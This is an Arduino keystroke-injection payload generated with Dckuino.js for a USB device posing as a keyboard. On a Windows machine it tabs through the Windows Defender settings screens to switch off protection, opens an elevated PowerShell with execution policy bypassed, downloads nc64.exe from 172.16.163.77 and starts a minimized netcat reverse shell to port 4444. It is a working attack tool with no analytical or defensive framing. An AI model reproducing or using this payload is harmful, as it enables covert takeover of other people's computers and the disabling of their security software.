/*
 * Generated with <3 by Dckuino.js, an open source project !
 */

#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  // it's time to disable the fuckin' defender....
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(200);

  Keyboard.print("windowsdefender://threat/");

  typeKey(KEY_RETURN);

  delay(1000);

  typeKey(KEY_TAB);

  delay(1000);

  typeKey(KEY_TAB);

  delay(1000);

  typeKey(KEY_TAB);

  delay(1000);

  typeKey(KEY_TAB);

  delay(500);

  typeKey(KEY_RETURN);

  delay(500);

  typeKey(' ');

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  Keyboard.releaseAll();

  delay(1000);

  typeKey(KEY_TAB);

  delay(500);

  typeKey(' ');

  delay(500);

  typeKey(KEY_TAB);

  delay(500);

  typeKey(' ');

  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(200);

  Keyboard.print("powershell Start-Process powershell -Verb runAs");

  typeKey(KEY_RETURN);

  delay(4000);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("cd \\; md new; cd new; echo (powershell Invoke-WebRequest -OutFile shell.exe 'http://172.16.163.77/nc64.exe') > psh.ps1; powershell -ExecutionPolicy Bypass -file psh.ps1");

  typeKey(KEY_RETURN);  

  delay(5000);

  Keyboard.print("cmd.exe");

  delay(500);

  typeKey(KEY_RETURN);

  delay(2000);

  Keyboard.print("START /MIN shell.exe 172.16.163.77 4444 -e cmd.exe -d & exit");

  typeKey(KEY_RETURN);

  delay(100);

  Keyboard.print("EXIT");

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}